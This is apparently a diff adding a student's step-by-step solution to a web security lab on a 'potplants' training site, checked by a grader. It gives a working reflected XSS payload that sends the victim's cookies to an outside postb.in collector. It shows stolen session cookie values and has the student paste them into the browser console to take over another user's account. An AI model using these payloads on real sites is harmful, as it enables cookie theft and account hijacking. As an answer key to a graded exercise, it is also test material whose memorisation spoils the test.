@@ -1,0 +1,38 @@
+Input this will display current cookies 
+
+http://potplants1.vikaa.fi:51307/<script>alert(document.cookie)</script>
+
+Go to this website
+https://postb.in/
+
+then create bin
+We see sth like wget https://postb.in/1634241275201-9862959340680?hello=world 
+
+keep only the address
+
+=> https://postb.in/1634241275201-9862959340680
+
+Then replace the address into <address> in this link:
+http://potplants1.vikaa.fi:51307/<img src=x onerror="javascript:document.location='<address>?cookie='+document.cookie">
+
+We get 
+http://potplants1.vikaa.fi:51307/<img src=x onerror="javascript:document.location='https://postb.in/1634241275201-9862959340680?cookie='+document.cookie">
+
+Submit this link to grader without useerand, step 1
+
+Refresh post bin, we can see the cookies of Robo account,
+which is sth like 
+connect.sid=s:CE0DmFODDJ5ryrx8PduTSNa9whDjix3Y.aTJRCtn4cQTFdyjtzcocaw/Ww0BlBZzEKY9S4CLruWU; 
+_csrf=d6aLcx4TlxUTg03FehOU2hnB; 
+userrand=0120e3d54fb7f76beae7b33bbab03259
+
+Step 2: copy userrand of Robo into grader without link, then submit
+
+Go to potplant website, log in with student.
+Open developer tools, open console tab, then change cookie with Robo's cookies into the console tab like below
+
+document.cookie = "connect.sid=s:CE0DmFODDJ5ryrx8PduTSNa9whDjix3Y.aTJRCtn4cQTFdyjtzcocaw/Ww0BlBZzEKY9S4CLruWU; _csrf=d6aLcx4TlxUTg03FehOU2hnB; userrand=0120e3d54fb7f76beae7b33bbab03259"
+
+Hit enter, the website changes to Robo's account. Create new plant with name I was hacked, shared to others: yes, and save
+
+Step 3: go to grader and click submit, without link and userrand
